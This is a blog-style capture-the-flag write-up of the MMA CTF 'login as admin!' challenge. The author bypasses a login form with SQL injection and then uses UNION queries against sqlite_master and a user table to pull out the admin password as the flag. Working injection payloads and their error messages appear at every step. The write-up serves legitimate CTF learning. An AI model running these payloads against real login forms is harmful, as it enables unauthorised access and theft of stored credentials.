---
title:  "MMA CTF Writeup - Login as admin!"
date:   2015-09-06 20:00:00
tags:   ctf, writeup
---

This weekend, [Kernel Sanders](http://ufsit.org) participated in [MMA CTF](https://uecmma.github.io/mmactf/)! Unfortunately, since I had homework and the beginnings of the flu, I was only to participate for a little bit, but I did have the opportunity to solve a challenge. "login as admin!" was worth 30pts and put Kernel Sanders in 42nd place (at the time).

![Challenge](assets/images/mmactf/challenge.png)

Going to the challenge presents us with a login screen:
![Login screen](assets/images/mmactf/login-screen.png)

Using the test login, I log in using the test account and find that it works!
![Test user](assets/images/mmactf/test-user.png)

Let's log out and just try to log in as the admin with no password. This gives the following error:
![Login error](assets/images/mmactf/login-error.png)

Well, I guess they're actually checking the login information... let's see if I can log in with a simple SQL injection. I use 

```sql
' or 1=1; --
```
as the password and, boom! I'm in:
![Admin user](assets/images/mmactf/admin-user.png)

Wait, where's the password?! Boo I guess we better get the password from the database. Let's hope they're not hashing it! But, seeing as they've left the door open for SQL injection, I'm sure they're not _that_ competent.

Anyway, I go ahead and try to use `UNION` to exchange the username for the password:

```sql
' UNION SELECT * FROM users; --
```
![Table error](assets/images/mmactf/table-error.png)

There's... no users table? Uh, ok. They have to be pulling this information from somewhere. Let's see if we can get a list of the tables:

```sql
' UNION SELECT * FROM information_schema.tables; --
```

However, this gives me the following error: 

```
no such table: information_schema.tables
```

Guess they're not using MySQL... how about sqlite?

```sql
' UNION SELECT name FROM sqlite_master WHERE type = "table"; --
```

Now this gives me the following error:

```
SELECTs to the left and right of UNION do not have the same number of result columns
```

Well, ok. I guess they must be fetching more than one column. Let's add `NULL`s until it works.

```sql
' UNION SELECT name, NULL FROM sqlite_master WHERE type = "table"; --
``` 

Now it works! I get the following output:

```
You are user user.
```

Apparently, they named the table 'user' instead of 'users'. Slight hiccup, but let's continue on.

```sql
' UNION SELECT * FROM user WHERE username='admin'; --
```

This gives the following error:

```
no such column: username
```

Ugh. Ok, let's try 'user' instead of 'username':

```sql
' UNION SELECT * FROM user WHERE user='admin'; --
```

Boom! I'm in again as the admin user. So, now I know they have a 'user' table with an attribute of 'user' and (most likely) 'password'. Let's try to SELECT the user and password:

```sql
' UNION SELECT user, password FROM user WHERE user='admin'; --
```

This logs me in as the admin user again which means that 'password' is called 'password'.

What else to try? Well, why not switch 'user' and 'password'?

```sql
' UNION SELECT password, user FROM user WHERE user='admin'; --
```

Booyah! I'm able to log in and see the following:
![Key!](assets/images/mmactf/key.png)

Success! Entering `MMA{cats_alice_band}` as the key gives Kernel Sanders +30 points!
